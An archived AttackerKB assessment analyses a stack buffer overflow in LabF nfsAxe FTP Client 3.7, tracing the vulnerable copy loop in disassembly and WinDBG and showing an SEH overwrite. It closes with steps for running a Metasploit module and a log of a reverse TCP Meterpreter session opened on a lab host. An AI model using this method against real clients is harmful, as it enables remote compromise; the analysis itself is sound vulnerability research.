---
title: LabF nfsAxe FTP Client 3.7 Stack Buffer Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2018-01-22T04:29:00'
created: '2019-09-12T18:07:30.232159'
revision_date: '2020-02-13T17:12:14.811328'
assessment_id: 21bd2a9b-7d0a-460b-9b22-e268b7c45324
topic_id: 49bb9a66-fb59-4588-bc09-abe121816aaf
topic_short_id: Ub2ZRNvOYR
topic_slug: labf-nfsaxe-ftp-client-3-7-stack-buffer-overflow
akb_topic_url: https://attackerkb.com/topics/Ub2ZRNvOYR/labf-nfsaxe-ftp-client-3-7-stack-buffer-overflow
akb_assessment_url: https://attackerkb.com/topics/Ub2ZRNvOYR/labf-nfsaxe-ftp-client-3-7-stack-buffer-overflow#21bd2a9b-7d0a-460b-9b22-e268b7c45324
---

# LabF nfsAxe FTP Client 3.7 Stack Buffer Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/Ub2ZRNvOYR/labf-nfsaxe-ftp-client-3-7-stack-buffer-overflow#21bd2a9b-7d0a-460b-9b22-e268b7c45324).*

---

 This is plib_free__3()
0:001> g
Destination buffer for WS2_32!recv() is at: 0x0233f4f4
```

Now we have located the destination buffer, and we know that eventually this will overflow.
But we need to determine how this pointer is passed around.

If we manaully cross-reference what other functions are passing a buffer pointer to ```sub_4383C0()```,
you will notice there are too many stack buffer overflows. This took some time and breakpoints to figure
out, but the correct code path for the our vulnerability should be:

```
sub_42C890() -> sub_42EE10() -> sub_42EA00() ->  sub_4383C0()
```

Inside ```sub_42C890()```, we find the stack buffer:

```
AUTO:0042C8FF loc_42C8FF:                             ; CODE XREF: sub_42C890+16Aj
AUTO:0042C8FF                                         ; sub_42C890+1B5j
AUTO:0042C8FF                 push    edi
AUTO:0042C900                 mov     ebx, 3FFh
AUTO:0042C905                 lea     edx, [esp+2424h+var_41C]
AUTO:0042C90C                 push    1
AUTO:0042C90E                 mov     eax, ds:dword_465100
AUTO:0042C913                 mov     ecx, edi
AUTO:0042C915                 call    sub_42EE10
```

And var_41C is 1024 bytes:

```
-0000041C var_41C         db 1024 dup(?)
```

Once we know where the stack buffer comes from, we can move on to how the exploit crashes ftp.exe.
We can observe this crash by setting up these breakpoints first to track the buffer pointer:

```
bp 0042c915 ".printf \"Passing static buffer pointer at 0x%08x\", edx; .echo ;g"
bp 0042ea0c ".printf \"Destination buffer for receive is: 0x%08x\n\", edx; .echo; g"
bp 0042eb73 ".printf \"EDX Text dump: %ma\n\", edx; .echo; .echo; g"
```

The WinDBG output with the above breakpoints:

```
Passing static buffer pointer at 0x027ff4f4
Destination buffer for receive is: 0x027ff4f4
EDX Text dump: AAAAAAAAAAAAAAA ........ AAAAAAAAAAAAAAA (a very long string)

(d48.864): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=000003fe ecx=ffffdbfc edx=000003fe esi=027ffc02 edi=02800000
eip=0042cac5 esp=027fd4ec ebp=000023ee iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
ftp+0x2cac5:
0042cac5 8807            mov     byte ptr [edi],al          ds:0023:02800000=??
```

In this crash, ESI is the source input, which is filled with our malicious input:

```
0:001> dd esi
027ffc02  41414141 41414141 41414141 41414141
027ffc12  41414141 41414141 41414141 41414141
027ffc22  41414141 41414141 41414141 41414141
027ffc32  41414141 41414141 41414141 41414141
027ffc42  41414141 41414141 41414141 41414141
027ffc52  41414141 41414141 41414141 41414141
027ffc62  41414141 41414141 41414141 41414141
027ffc72  41414141 41414141 41414141 41414141
```

EDI would be the destination buffer used for this copy routine:

```
AUTO:0042CAC3 loc_42CAC3:                             ; CODE XREF: sub_42C890+249j
AUTO:0042CAC3                 mov     al, [esi]       ; ESI is the malicious input
AUTO:0042CAC5                 mov     [edi], al       ; EDI = our buffer, and AL is a byte from the malicious input
AUTO:0042CAC7                 cmp     al, 0           ; Check null byte
AUTO:0042CAC9                 jz      short loc_42CADB ; Done copying
AUTO:0042CACB                 mov     al, [esi+1]     ; The next byte
AUTO:0042CACE                 add     esi, 2
AUTO:0042CAD1                 mov     [edi+1], al
AUTO:0042CAD4                 add     edi, 2
AUTO:0042CAD7                 cmp     al, 0
AUTO:0042CAD9                 jnz     short loc_42CAC3 ; Continue copying if string isn't null
```

Since the exploit supplies a string that is long enough, the SEH chain on the stack is also
overwritten:

```
0:001> !exchain
027fff70: 41414141
Invalid exception stack at 41414141
```

The exploit simply overwrites the SEH chain to gain arbitrary code execution.


## Verification Steps

To test the exploit:

1. Install the application
2. Start `msfconsole`
3. Do: `use exploit/windows/ftp/labf_nfsaxe`
4. Set options and payload
5. Do: `exploit`
6. Connect to the FTP server using the FTP client
7. You should get a session like the following demonstration:

```
msf exploit(windows/ftp/labf_nfsaxe) > run

[*] Started reverse TCP handler on 172.16.85.1:4444
[*] Please ask your target(s) to connect to 172.16.85.1:21
[*] Server started.
msf exploit(windows/ftp/labf_nfsaxe) >
[*] 172.16.85.134 - connected.
[*] 172.16.85.134 - Response: Sending 220 Welcome
[*] 172.16.85.134 - Request: AUTH GSSAPI
[*] 172.16.85.134 - Response: sending 331 OK
[*] 172.16.85.134 - Request: ADAT TlRMTVNTUA==
[*] 172.16.85.134 - Response: Sending 230 OK
[*] 172.16.85.134 - Request: USER Guest
[*] 172.16.85.134 - Request: Sending the malicious response
[*] Sending stage (179779 bytes) to 172.16.85.134
[*] Meterpreter session 1 opened (172.16.85.1:4444 -> 172.16.85.134:49213) at 2018-01-09 22:38:33 -0600
```
